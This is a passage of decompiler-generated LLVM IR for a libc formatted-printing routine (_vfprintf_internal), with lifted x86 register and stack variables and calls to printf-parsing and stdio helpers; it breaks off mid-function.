define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e993 = load i32, i32* @ebx, align 4
  store i32 %v0_804e993, i32* %stack_var_-16, align 4
  %v4_804e993 = ptrtoint i32* %stack_var_-16 to i32
  %v1_804e994 = add i32 %v4_804e993, -356
  %v10_804e994 = icmp slt i32 %v1_804e994, 0
  store i1 %v10_804e994, i1* %sf.global-to-local, align 1
  %v4_804e99a = ptrtoint i8* %arg2 to i32
  store i32 %v4_804e99a, i32* @ebx, align 4
  %v2_804e9a2 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_804e9a2, i32* @esi, align 4
  %v5_804e9a7 = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_804e99a)
  store i32 %v5_804e9a7, i32* %eax.global-to-local, align 4
  %v2_804e9af = icmp slt i32 %v5_804e9a7, 0
  store i1 %v2_804e9af, i1* %sf.global-to-local, align 1
  %v1_804e9b1 = icmp eq i1 %v2_804e9af, false
  br i1 %v1_804e9b1, label %dec_label_pc_804e9f1, label %dec_label_pc_804e9b3

dec_label_pc_804e9b3:                             ; preds = %entry
  %v12_804e9ac = ptrtoint i32* %stack_var_-364 to i32
  %v3_804e9b3 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_804e9b3, i32* @ebx, align 4
  %v1_804e9b7 = add i32 %v12_804e9ac, -12
  %v10_804e9b7 = icmp slt i32 %v1_804e9b7, 0
  store i1 %v10_804e9b7, i1* %sf.global-to-local, align 1
  %v5_804e9ba = inttoptr i32 %v3_804e9b3 to i8*
  %v3_804e9bb = call i32 @strlen(i8* %v5_804e9ba)
  store i32 %v3_804e9bb, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v1_804e9ca = icmp eq i32 %v3_804e9bb, 0
  %v2_804e9ca = icmp slt i32 %v3_804e9bb, 0
  store i1 %v2_804e9ca, i1* %sf.global-to-local, align 1
  br i1 %v1_804e9ca, label %dec_label_pc_804ef3a, label %dec_label_pc_804e9d2

dec_label_pc_804e9d2:                             ; preds = %dec_label_pc_804e9b3
  %v0_804e9d2 = load i32, i32* @edx, align 4
  %v0_804e9db = load i32, i32* @ebx, align 4
  %v6_804e9dc = call i32 @__stdio_fwrite(i32 %v0_804e9db, i32 %v3_804e9bb, i32 %arg1, i32 %v0_804e9d2)
  store i32 %v6_804e9dc, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v0_804e9e9 = load i32, i32* @esp, align 4
  %v1_804e9e9 = add i32 %v0_804e9e9, 16
  %v7_804e9e9 = icmp slt i32 %v1_804e9e9, 0
  store i1 %v7_804e9e9, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804ef3a

dec_label_pc_804e9f1:                             ; preds = %entry
  %v6_804e9fb = call i32 @_ppfs_prepargs(i32 %v2_804e9a2, i32 %arg3, i32 %v5_804e9a7, i32 %v5_804e9a7)
  store i32 %v6_804e9fb, i32* %eax.global-to-local, align 4
  %v0_804ea00 = load i32, i32* @ebx, align 4
  store i32 %v0_804ea00, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_804ea0a = load i32, i32* @esp, align 4
  %v1_804ea0a = add i32 %v0_804ea0a, 16
  %v7_804ea0a = icmp slt i32 %v1_804ea0a, 0
  store i1 %v7_804ea0a, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804ea10

dec_label_pc_804ea0f:                             ; preds = %dec_label_pc_804ea16
  %v1_804ea0f = add i32 %v0_804ea1e, 1
  %v9_804ea0f = icmp slt i32 %v1_804ea0f, 0
  store i1 %v9_804ea0f, i1* %sf.global-to-local, align 1
  store i32 %v1_804ea0f, i32* @ebx, align 4
  br label %dec_label_pc_804ea10.backedge

dec_label_pc_804ea10.backedge:                    ; preds = %dec_label_pc_804ea0f, %dec_label_pc_804ef20, %dec_label_pc_804ef2b
  %v1_804ea1a20 = phi i32 [ %v1_804ea22, %dec_label_pc_804ea0f ], [ %v3_804ef20, %dec_label_pc_804ef20 ], [ %v1_804ea4e, %dec_label_pc_804ef2b ]
  %v0_804ea1018 = phi i32 [ %v1_804ea0f, %dec_label_pc_804ea0f ], [ %v3_804ef20, %dec_label_pc_804ef20 ], [ %v1_804ef2b, %dec_label_pc_804ef2b ]
  %v4_804ea10.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ea10

dec_label_pc_804ea10:                             ; preds = %dec_label_pc_804ea10.backedge, %dec_label_pc_804e9f1
  %v1_804ea22 = phi i32 [ %v1_804ea1a20, %dec_label_pc_804ea10.backedge ], [ %v0_804ea00, %dec_label_pc_804e9f1 ]
  %v0_804ea1e = phi i32 [ %v0_804ea1018, %dec_label_pc_804ea10.backedge ], [ %v0_804ea00, %dec_label_pc_804e9f1 ]
  %v4_804ea10 = phi i32 [ %v4_804ea10.pre, %dec_label_pc_804ea10.backedge ], [ %v6_804e9fb, %dec_label_pc_804e9f1 ]
  %v1_804ea10 = inttoptr i32 %v0_804ea1e to i8*
  %v2_804ea10 = load i8, i8* %v1_804ea10, align 1
  %v3_804ea10 = zext i8 %v2_804ea10 to i32
  %v5_804ea10 = and i32 %v4_804ea10, -256
  %v6_804ea10 = or i32 %v3_804ea10, %v5_804ea10
  store i32 %v6_804ea10, i32* %eax.global-to-local, align 4
  %v4_804ea12 = icmp eq i8 %v2_804ea10, 0
  %v5_804ea12 = icmp slt i8 %v2_804ea10, 0
  store i1 %v5_804ea12, i1* %sf.global-to-local, align 1
  br i1 %v4_804ea12, label %dec_label_pc_804ea1a, label %dec_label_pc_804ea16

dec_label_pc_804ea16:                             ; preds = %dec_label_pc_804ea10
  %v2_804ea16 = add i8 %v2_804ea10, -37
  %v10_804ea16 = icmp eq i8 %v2_804ea16, 0
  %v11_804ea16 = icmp slt i8 %v2_804ea16, 0
  store i1 %v11_804ea16, i1* %sf.global-to-local, align 1
  %v1_804ea18 = icmp eq i1 %v10_804ea16, false
  br i1 %v1_804ea18, label %dec_label_pc_804ea0f, label %dec_label_pc_804ea1a

dec_label_pc_804ea1a:                             ; preds = %dec_label_pc_804ea16, %dec_label_pc_804ea10
  %v2_804ea1a = sub i32 %v0_804ea1e, %v1_804ea22
  %v12_804ea1a = icmp eq i32 %v2_804ea1a, 0
  %v13_804ea1a = icmp slt i32 %v2_804ea1a, 0
  store i1 %v13_804ea1a, i1* %sf.global-to-local, align 1
  br i1 %v12_804ea1a, label %dec_label_pc_804ea45, label %dec_label_pc_804ea1e

dec_label_pc_804ea1e:                             ; preds = %dec_label_pc_804ea1a
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804ea1a, i32* @esi, align 4
  store i1 %v13_804ea1a, i1* %sf.global-to-local, align 1
  %tmp65 = icmp slt i32 %v2_804ea1a, 1
  br i1 %tmp65, label %dec_label_pc_804ea3a, label %dec_label_pc_804ea28

dec_label_pc_804ea28:                             ; preds = %dec_label_pc_804ea1e
  %v0_804ea28 = load i32, i32* @ebp, align 4
  %v1_804ea28 = load i32, i32* @esp, align 4
  %v2_804ea28 = add i32 %v1_804ea28, -4
  %v3_804ea28 = inttoptr i32 %v2_804ea28 to i32*
  store i32 %v0_804ea28, i32* %v3_804ea28, align 4
  %v1_804ea29 = add i32 %v1_804ea28, 368
  %v2_804ea29 = inttoptr i32 %v1_804ea29 to i32*
  %v3_804ea29 = load i32, i32* %v2_804ea29, align 4
  %v5_804ea29 = add i32 %v1_804ea28, -8
  %v6_804ea29 = inttoptr i32 %v5_804ea29 to i32*
  store i32 %v3_804ea29, i32* %v6_804ea29, align 4
  %v0_804ea30 = load i32, i32* @esi, align 4
  %v2_804ea30 = add i32 %v1_804ea28, -12
  %v3_804ea30 = inttoptr i32 %v2_804ea30 to i32*
  store i32 %v0_804ea30, i32* %v3_804ea30, align 4
  %v0_804ea31 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ea31 = add i32 %v1_804ea28, -16
  %v3_804ea31 = inttoptr i32 %v2_804ea31 to i32*
  store i32 %v0_804ea31, i32* %v3_804ea31, align 4
  %v0_804ea32 = load i32, i32* %stack_var_-364, align 4
  %v4_804ea32 = call i32 @__stdio_fwrite(i32 %v0_804ea32, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ea32, i32* %eax.global-to-local, align 4
  %v0_804ea37 = load i32, i32* @esp, align 4
  %v1_804ea37 = add i32 %v0_804ea37, 16
  %v7_804ea37 = icmp slt i32 %v1_804ea37, 0
  store i1 %v7_804ea37, i1* %sf.global-to-local, align 1
  %v1_804ea3a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ea3a

dec_label_pc_804ea3a:                             ; preds = %dec_label_pc_804ea1e, %dec_label_pc_804ea28
  %v3_804ea42 = phi i32 [ %v2_804ea1a, %dec_label_pc_804ea1e ], [ %v1_804ea3a.pre, %dec_label_pc_804ea28 ]
  %v0_804ea3a = phi i32 [ 0, %dec_label_pc_804ea1e ], [ %v4_804ea32, %dec_label_pc_804ea28 ]
  %v2_804ea3a = sub i32 %v0_804ea3a, %v3_804ea42
  %v12_804ea3a = icmp eq i32 %v2_804ea3a, 0
  %v13_804ea3a = icmp slt i32 %v2_804ea3a, 0
  store i1 %v13_804ea3a, i1* %sf.global-to-local, align 1
  %v1_804ea3c = icmp eq i1 %v12_804ea3a, false
  %v0_804ef33.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804ea3c, label %dec_label_pc_804ef33, label %dec_label_pc_804ea42

dec_label_pc_804ea42:                             ; preds = %dec_label_pc_804ea3a
  %v1_804ea42 = inttoptr i32 %v0_804ef33.pre.pre to i32*
  %v2_804ea42 = load i32, i32* %v1_804ea42, align 4
  %v4_804ea42 = add i32 %v2_804ea42, %v3_804ea42
  %v15_804ea42 = icmp slt i32 %v4_804ea42, 0
  store i1 %v15_804ea42, i1* %sf.global-to-local, align 1
  store i32 %v4_804ea42, i32* %v1_804ea42, align 4
  %v0_804ea45.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ea45

dec_label_pc_804ea45:                             ; preds = %dec_label_pc_804ea1a, %dec_label_pc_804ea42
  %v0_804ef2b = phi i32 [ %v0_804ea1e, %dec_label_pc_804ea1a ], [ %v0_804ea45.pre, %dec_label_pc_804ea42 ]
  %v1_804ea45 = inttoptr i32 %v0_804ef2b to i8*
  %v2_804ea45 = load i8, i8* %v1_804ea45, align 1
  %v3_804ea45 = icmp eq i8 %v2_804ea45, 0
  %v4_804ea45 = icmp slt i8 %v2_804ea45, 0
  store i1 %v4_804ea45, i1* %sf.global-to-local, align 1
  br i1 %v3_804ea45, label %dec_label_pc_804ef3a, label %dec_label_pc_804ea4e

dec_label_pc_804ea4e:                             ; preds = %dec_label_pc_804ea45
  %v1_804ea4e = add i32 %v0_804ef2b, 1
  %v2_804ea4e = inttoptr i32 %v1_804ea4e to i8*
  %v3_804ea4e = load i8, i8* %v2_804ea4e, align 1
  %v4_804ea4e = add i8 %v3_804ea4e, -37
  %v12_804ea4e = icmp eq i8 %v4_804ea4e, 0
  %v13_804ea4e = icmp slt i8 %v4_804ea4e, 0
  store i1 %v13_804ea4e, i1* %sf.global-to-local, align 1
  store i32 %v1_804ea4e, i32* %edx.global-to-local, align 4
  br i1 %v12_804ea4e, label %dec_label_pc_804ef2b, label %dec_label_pc_804ea5b

dec_label_pc_804ea5b:                             ; preds = %dec_label_pc_804ea4e
  %v1_804ea5b = load i32, i32* @esp, align 4
  %v2_804ea5b = add i32 %v1_804ea5b, 16
  %v3_804ea5b = inttoptr i32 %v2_804ea5b to i32*
  store i32 %v1_804ea4e, i32* %v3_804ea5b, align 4
  %v0_804ea5f = load i32, i32* @esp, align 4
  %v1_804ea5f = add i32 %v0_804ea5f, 340
  %v2_804ea5f = inttoptr i32 %v1_804ea5f to i32*
  store i32 0, i32* %v2_804ea5f, align 4
  %v0_804ea6a = load i32, i32* @esp, align 4
  %v1_804ea6a = add i32 %v0_804ea6a, -12
  %v10_804ea6a = icmp slt i32 %v1_804ea6a, 0
  store i1 %v10_804ea6a, i1* %sf.global-to-local, align 1
  %v1_804ea6d = add i32 %v0_804ea6a, 16
  store i32 %v1_804ea6d, i32* @ebx, align 4
  %v2_804ea71 = add i32 %v0_804ea6a, -16
  %v3_804ea71 = inttoptr i32 %v2_804ea71 to i32*
  store i32 %v1_804ea6d, i32* %v3_804ea71, align 4
  %v0_804ea72 = load i32, i32* %stack_var_-364, align 4
  %v1_804ea72 = inttoptr i32 %v0_804ea72 to i32*
  %v2_804ea72 = call i32 @_ppfs_parsespec(i32* %v1_804ea72)
  store i32 %v2_804ea72, i32* %eax.global-to-local, align 4
  %v0_804ea77 = load i32, i32* @ebx, align 4
  %v1_804ea77 = load i32, i32* @esp, align 4
  %v2_804ea77 = inttoptr i32 %v1_804ea77 to i32*
  store i32 %v0_804ea77, i32* %v2_804ea77, align 4
  %v0_804ea7a = load i32, i32* %stack_var_-364, align 4
  %v1_804ea7a = call i32 @_ppfs_setargs(i32 %v0_804ea7a)
  store i32 %v1_804ea7a, i32* %eax.global-to-local, align 4
  %v0_804ea7f = load i32, i32* @esp, align 4
  %v1_804ea7f = add i32 %v0_804ea7f, 70
  %v2_804ea7f = inttoptr i32 %v1_804ea7f to i8*
  %v3_804ea7f = load i8, i8* %v2_804ea7f, align 1
  %v4_804ea7f = zext i8 %v3_804ea7f to i32
  store i32 %v4_804ea7f, i32* @edi, align 4
  %v1_804ea84 = add i32 %v0_804ea7f, 16
  %v1_804ea87 = add i32 %v0_804ea7f, 56
  %v2_804ea87 = inttoptr i32 %v1_804ea87 to i32*
  %v3_804ea87 = load i32, i32* %v2_804ea87, align 4
  %v5_804ea87 = icmp slt i32 %v3_804ea87, 0
  store i1 %v5_804ea87, i1* %sf.global-to-local, align 1
  %v1_804ea8c = add i32 %v0_804ea7f, 112
  store i32 %v1_804ea8c, i32* %edx.global-to-local, align 4
  %tmp66 = icmp slt i32 %v3_804ea87, 1
  br i1 %tmp66, label %dec_label_pc_804ea99, label %dec_label_pc_804ea92

dec_label_pc_804ea92:                             ; preds = %dec_label_pc_804ea5b
  %v2_804ea92 = zext i8 %v3_804ea7f to i32
  %v3_804ea92 = mul nuw nsw i32 %v2_804ea92, 12
  store i32 %v3_804ea92, i32* %eax.global-to-local, align 4
  %v2_804ea95 = add i32 %v0_804ea7f, 100
  %v3_804ea95 = add i32 %v2_804ea95, %v3_804ea92
  store i32 %v3_804ea95, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ea99

dec_label_pc_804ea99:                             ; preds = %dec_label_pc_804ea5b, %dec_label_pc_804ea92
  %v0_804eaa127 = phi i32 [ %v1_804ea8c, %dec_label_pc_804ea5b ], [ %v3_804ea95, %dec_label_pc_804ea92 ]
  %v1_804ea99 = add i32 %v0_804ea7f, 60
  %v2_804ea99 = inttoptr i32 %v1_804ea99 to i32*
  %v3_804ea99 = load i32, i32* %v2_804ea99, align 4
  store i32 %v3_804ea99, i32* %ecx.global-to-local, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804eaac72 = sub i32 0, %v3_804ea99
  %v10_804eaac75 = and i32 %v3_804ea99, %v2_804eaac72
  %v11_804eaac76 = icmp slt i32 %v10_804eaac75, 0
  %v13_804eaac77 = icmp slt i32 %v2_804eaac72, 0
  %v2_804eaae78 = icmp eq i1 %v13_804eaac77, %v11_804eaac76
  br i1 %v2_804eaae78, label %dec_label_pc_804eab0, label %dec_label_pc_804eaa1

dec_label_pc_804eaa1:                             ; preds = %dec_label_pc_804ea99, %dec_label_pc_804eaa1
  %v0_804eab082 = phi i32 [ %v0_804eab0, %dec_label_pc_804eaa1 ], [ %v1_804ea84, %dec_label_pc_804ea99 ]
  %v2_804eaa181 = phi i32 [ %v1_804eaab, %dec_label_pc_804eaa1 ], [ 0, %dec_label_pc_804ea99 ]
  %v0_804eaa180 = phi i32 [ %v1_804eaa8, %dec_label_pc_804eaa1 ], [ %v0_804eaa127, %dec_label_pc_804ea99 ]
  %v3_804eaa1 = mul i32 %v2_804eaa181, 4
  %v4_804eaa1 = add i32 %v3_804eaa1, 344
  %v5_804eaa1 = add i32 %v4_804eaa1, %v0_804eab082
  %v6_804eaa1 = inttoptr i32 %v5_804eaa1 to i32*
  store i32 %v0_804eaa180, i32* %v6_804eaa1, align 4
  %v0_804eaa8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804eaa8 = add i32 %v0_804eaa8, 12
  store i32 %v1_804eaa8, i32* %edx.global-to-local, align 4
  %v0_804eaab = load i32, i32* %eax.global-to-local, align 4
  %v1_804eaab = add i32 %v0_804eaab, 1
  %v1_804eaac.pre = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v1_804eaab, i32* %eax.global-to-local, align 4
  %v2_804eaac = sub i32 %v1_804eaab, %v1_804eaac.pre
  %v8_804eaac = xor i32 %v1_804eaab, %v1_804eaac.pre
  %v9_804eaac = xor i32 %v2_804eaac, %v1_804eaab
  %v10_804eaac = and i32 %v9_804eaac, %v8_804eaac
  %v11_804eaac = icmp slt i32 %v10_804eaac, 0
  %v13_804eaac = icmp slt i32 %v2_804eaac, 0
  %v2_804eaae = icmp eq i1 %v13_804eaac, %v11_804eaac
  %v0_804eab0 = load i32, i32* @esp, align 4
  br i1 %v2_804eaae, label %dec_label_pc_804eab0, label %dec_label_pc_804eaa1

dec_label_pc_804eab0:                             ; preds = %dec_label_pc_804eaa1, %dec_label_pc_804ea99
  %v0_804eab0.lcssa = phi i32 [ %v1_804ea84, %dec_label_pc_804ea99 ], [ %v0_804eab0, %dec_label_pc_804eaa1 ]
  %v1_804eab0 = add i32 %v0_804eab0.lcssa, 48
  %v2_804eab0 = inttoptr i32 %v1_804eab0 to i32*
  %v3_804eab0 = load i32, i32* %v2_804eab0, align 4
  store i32 %v3_804eab0, i32* %ecx.global-to-local, align 4
  %v1_804eab4 = icmp eq i32 %v3_804eab0, 0
  %v2_804eab4 = icmp slt i32 %v3_804eab0, 0
  store i1 %v2_804eab4, i1* %sf.global-to-local, align 1
  %v1_804eab6 = icmp eq i1 %v1_804eab4, false
  br i1 %v1_804eab6, label %dec_label_pc_804eade, label %dec_label_pc_804eab8

dec_label_pc_804eab8:                             ; preds = %dec_label_pc_804eab0
  %v1_804eab8 = inttoptr i32 %v0_804eab0.lcssa to i32*
  %v2_804eab8 = load i32, i32* %v1_804eab8, align 4
  store i32 %v2_804eab8, i32* %eax.global-to-local, align 4
  %v1_804eabb = ashr i32 %v2_804eab8, 31
  store i32 %v1_804eabb, i32* %edx.global-to-local, align 4
  %v2_804eabc = add i32 %v0_804eab0.lcssa, -4
  %v3_804eabc = inttoptr i32 %v2_804eabc to i32*
  store i32 %v1_804eabb, i32* %v3_804eabc, align 4
  %v0_804eabd = load i32, i32* %eax.global-to-local, align 4
  %v2_804eabd = add i32 %v0_804eab0.lcssa, -8
  %v3_804eabd = inttoptr i32 %v2_804eabd to i32*
  store i32 %v0_804eabd, i32* %v3_804eabd, align 4
  %v1_804eabe = add i32 %v0_804eab0.lcssa, 32
  %v2_804eabe = inttoptr i32 %v1_804eabe to i32*
  %v3_804eabe = load i32, i32* %v2_804eabe, align 4
  %v1_804eac2 = and i32 %v3_804eabe, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_804eac2, i32* %eax.global-to-local, align 4
  %v2_804eac7 = add i32 %v0_804eab0.lcssa, -12
  %v3_804eac7 = inttoptr i32 %v2_804eac7 to i32*
  store i32 %v1_804eac2, i32* %v3_804eac7, align 4
  %v1_804eac8 = add i32 %v0_804eab0.lcssa, 344
  %v2_804eac8 = inttoptr i32 %v1_804eac8 to i32*
  %v3_804eac8 = load i32, i32* %v2_804eac8, align 4
  store i32 %v3_804eac8, i32* %eax.global-to-local, align 4
  %v1_804eacf = inttoptr i32 %v3_804eac8 to i32*
  %v2_804eacf = load i32, i32* %v1_804eacf, align 4
  %v4_804eacf = add i32 %v0_804eab0.lcssa, -16
  %v5_804eacf = inttoptr i32 %v4_804eacf to i32*
  store i32 %v2_804eacf, i32* %v5_804eacf, align 4
  %v0_804ead1 = call i32 @_store_inttype()
  store i32 %v0_804ead1, i32* %eax.global-to-local, align 4
  %v0_804ead6 = load i32, i32* @esp, align 4
  %v1_804ead6 = add i32 %v0_804ead6, 16
  %v7_804ead6 = icmp slt i32 %v1_804ead6, 0
  store i1 %v7_804ead6, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804ef20

dec_label_pc_804eade:                             ; preds = %dec_label_pc_804eab0
  %v1_804eade = add i32 %v3_804eab0, -7
  %v5_804eade = icmp ult i32 %v3_804eab0, 7
  %v9_804eade = icmp eq i32 %v1_804eade, 0
  %v10_804eade = icmp slt i32 %v1_804eade, 0
  store i1 %v10_804eade, i1* %sf.global-to-local, align 1
  %v2_804eae1 = or i1 %v5_804eade, %v9_804eade
  br i1 %v2_804eae1, label %dec_label_pc_804eae7, label %dec_label_pc_804ec4b

dec_label_pc_804eae7:                             ; preds = %dec_label_pc_804eade
  %v1_804eae7 = add i32 %v3_804eab0, 134559344
  %v2_804eae7 = inttoptr i32 %v1_804eae7 to i8*
  %v3_804eae7 = load i8, i8* %v2_804eae7, align 1
  %v4_804eae7 = sext i8 %v3_804eae7 to i32
  store i32 %v4_804eae7, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_804eaf3 = icmp eq i8 %v3_804eae7, 10
  %v10_804eaf3 = icmp slt i8 %v3_804eae7, 10
  store i1 %v10_804eaf3, i1* %sf.global-to-local, align 1
  %v1_804eaf6 = icmp eq i1 %v9_804eaf3, false
  br i1 %v1_804eaf6, label %dec_label_pc_804eb16, label %dec_label_pc_804eaf8

dec_label_pc_804eaf8:                             ; preds = %dec_label_pc_804eae7
  %v1_804eaf8 = add i32 %v0_804eab0.lcssa, 32
  %v2_804eaf8 = inttoptr i32 %v1_804eaf8 to i32*
  %v3_804eaf8 = load i32, i32* %v2_804eaf8, align 4
  store i32 %v3_804eaf8, i32* %eax.global-to-local, align 4
  %v1_804eafe = udiv i32 %v3_804eaf8, 32
  %tmp67 = urem i32 %v1_804eafe, 2
  %tmp68 = sub nsw i32 45, %tmp67
  %v2_804eb0e = or i32 %tmp68, 128
  store i32 %v2_804eb0e, i32* %edx.global-to-local, align 4
  %v2_804eb11 = and i32 %v3_804eaf8, 64
  %v3_804eb11 = icmp eq i32 %v2_804eb11, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804eb13 = icmp eq i1 %v3_804eb11, false
  %v4_804eb13 = select i1 %v1_804eb13, i32 %v2_804eb0e, i32 %tmp68
  store i32 %v4_804eb13, i32* @ebx, align 4
  br label %dec_label_pc_804eb16

dec_label_pc_804eb16:                             ; preds = %dec_label_pc_804eae7, %dec_label_pc_804eaf8
  %v1_804eb16 = add i32 %v3_804eab0, -5
  %v5_804eb16 = icmp ult i32 %v3_804eab0, 5
  %v9_804eb16 = icmp eq i32 %v1_804eb16, 0
  %v10_804eb16 = icmp slt i32 %v1_804eb16, 0
  store i1 %v10_804eb16, i1* %sf.global-to-local, align 1
  %v2_804eb19 = or i1 %v5_804eb16, %v9_804eb16
  br i1 %v2_804eb19, label %dec_label_pc_804eb1b, label %dec_label_pc_804eb33

dec_label_pc_804eb1b:                             ; preds = %dec_label_pc_804eb16
  %v1_804eb1b = add i32 %v3_804eab0, -3
  %v9_804eb1b = icmp eq i32 %v1_804eb1b, 0
  %v10_804eb1b = icmp slt i32 %v1_804eb1b, 0
  store i1 %v10_804eb1b, i1* %sf.global-to-local, align 1
  %v1_804eb1e = icmp eq i1 %v9_804eb1b, false
  br i1 %v1_804eb1e, label %dec_label_pc_804eb27, label %dec_label_pc_804eb20

dec_label_pc_804eb20:                             ; preds = %dec_label_pc_804eb1b
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804eb35

dec_label_pc_804eb27:                             ; preds = %dec_label_pc_804eb1b
  %v1_804eb27 = add i32 %v3_804eab0, -1
  %v9_804eb27 = icmp eq i32 %v1_804eb27, 0
  %v10_804eb27 = icmp slt i32 %v1_804eb27, 0
  store i1 %v10_804eb27, i1* %sf.global-to-local, align 1
  br i1 %v9_804eb27, label %dec_label_pc_804eb3a, label %dec_label_pc_804eb35

dec_label_pc_804eb33:                             ; preds = %dec_label_pc_804eb16
  %v1_804eb33 = sub nsw i32 0, %v4_804eae7
  %v7_804eb33 = icmp sgt i8 %v3_804eae7, 0
  store i1 %v7_804eb33, i1* %sf.global-to-local, align 1
  store i32 %v1_804eb33, i32* @esi, align 4
  br label %dec_label_pc_804eb35

dec_label_pc_804eb35:                             ; preds = %dec_label_pc_804eb27, %dec_label_pc_804eb20, %dec_label_pc_804eb33
  br label %dec_label_pc_804eb3a

dec_label_pc_804eb3a:                             ; preds = %dec_label_pc_804eb27, %dec_label_pc_804eb35
  %storemerge = phi i32 [ 11, %dec_label_pc_804eb35 ], [ 6, %dec_label_pc_804eb27 ]
  store i32 %storemerge, i32* @ebp, align 4
  %v1_804eb3a = add i32 %v0_804eab0.lcssa, 20
  %v2_804eb3a = inttoptr i32 %v1_804eb3a to i32*
  %v3_804eb3a = load i32, i32* %v2_804eb3a, align 4
  %v5_804eb3a = icmp slt i32 %v3_804eb3a, 0
  store i1 %v5_804eb3a, i1* %sf.global-to-local, align 1
  %v1_804eb3f = add i32 %v0_804eab0.lcssa, 7
  %v2_804eb3f = inttoptr i32 %v1_804eb3f to i8*
  store i8 32, i8* %v2_804eb3f, align 1
  %v0_804eb44 = load i1, i1* %sf.global-to-local, align 1
  %v1_804eb44 = icmp eq i1 %v0_804eb44, false
  br i1 %v1_804eb44, label %dec_label_pc_804eb4e, label %dec_label_pc_804eb46

dec_label_pc_804eb46:                             ; preds = %dec_label_pc_804eb3a
  %v0_804eb46 = load i32, i32* @esp, align 4
  %v1_804eb46 = add i32 %v0_804eb46, 36
  %v2_804eb46 = inttoptr i32 %v1_804eb46 to i8*
  %v3_804eb46 = load i8, i8* %v2_804eb46, align 1
  %v4_804eb46 = zext i8 %v3_804eb46 to i32
  %v5_804eb46 = load i32, i32* %edx.global-to-local, align 4
  %v6_804eb46 = and i32 %v5_804eb46, -256
  %v7_804eb46 = or i32 %v6_804eb46, %v4_804eb46
  store i32 %v7_804eb46, i32* %edx.global-to-local, align 4
  %v3_804eb4a = add i32 %v0_804eb46, 7
  %v4_804eb4a = inttoptr i32 %v3_804eb4a to i8*
  store i8 %v3_804eb46, i8* %v4_804eb4a, align 1
  br label %dec_label_pc_804eb4e

dec_label_pc_804eb4e:                             ; preds = %dec_label_pc_804eb3a, %dec_label_pc_804eb46
  %v1_804eb4e = add i32 %v3_804eab0, -1
  %v8_804eb4e = icmp eq i32 %v1_804eb4e, 0
  %v9_804eb4e = icmp slt i32 %v1_804eb4e, 0
  store i1 %v9_804eb4e, i1* %sf.global-to-local, align 1
  store i32 %v1_804eb4e, i32* %ecx.global-to-local, align 4
  %v0_804eb4f = load i32, i32* @esp, align 4
  %v1_804eb4f = add i32 %v0_804eb4f, 344
  %v2_804eb4f = inttoptr i32 %v1_804eb4f to i32*
  %v3_804eb4f = load i32, i32* %v2_804eb4f, align 4
  store i32 %v3_804eb4f, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_804eb67.pre = load i32, i32* @edi, align 4
  br i1 %v8_804eb4e, label %dec_label_pc_804eb67, label %dec_label_pc_804eb5d

dec_label_pc_804eb5d:                             ; preds = %dec_label_pc_804eb4e
  %v2_804eb5d = mul i32 %v0_804eb67.pre, 4
  %v3_804eb5d = add i32 %v0_804eb4f, 52
  %v4_804eb5d = add i32 %v3_804eb5d, %v2_804eb5d
  %v5_804eb5d = inttoptr i32 %v4_804eb5d to i32*
  %v6_804eb5d = load i32, i32* %v5_804eb5d, align 4
  %v1_804eb61 = and i32 %v6_804eb5d, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_804eb61, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804eb67

dec_label_pc_804eb67:                             ; preds = %dec_label_pc_804eb4e, %dec_label_pc_804eb5d
  %v2_804eb67 = add i32 %v0_804eb4f, -4
  %v3_804eb67 = inttoptr i32 %v2_804eb67 to i32*
  store i32 %v0_804eb67.pre, i32* %v3_804eb67, align 4
  %v0_804eb68 = load i32, i32* @esi, align 4
  %v2_804eb68 = add i32 %v0_804eb4f, -8
  %v3_804eb68 = inttoptr i32 %v2_804eb68 to i32*
  store i32 %v0_804eb68, i32* %v3_804eb68, align 4
  %v0_804eb69 = load i32, i32* %eax.global-to-local, align 4
  %v2_804eb69 = add i32 %v0_804eb4f, -12
  %v3_804eb69 = inttoptr i32 %v2_804eb69 to i32*
  store i32 %v0_804eb69, i32* %v3_804eb69, align 4
  %v0_804eb6a = load i32, i32* %edx.global-to-local, align 4
  %v2_804eb6a = add i32 %v0_804eb4f, -16
  %v3_804eb6a = inttoptr i32 %v2_804eb6a to i32*
  store i32 %v0_804eb6a, i32* %v3_804eb6a, align 4
  %v0_804eb6b = call i32 @_load_inttype()
  %v0_804eb70 = load i32, i32* @ebx, align 4
  %v1_804eb70 = load i32, i32* @esp, align 4
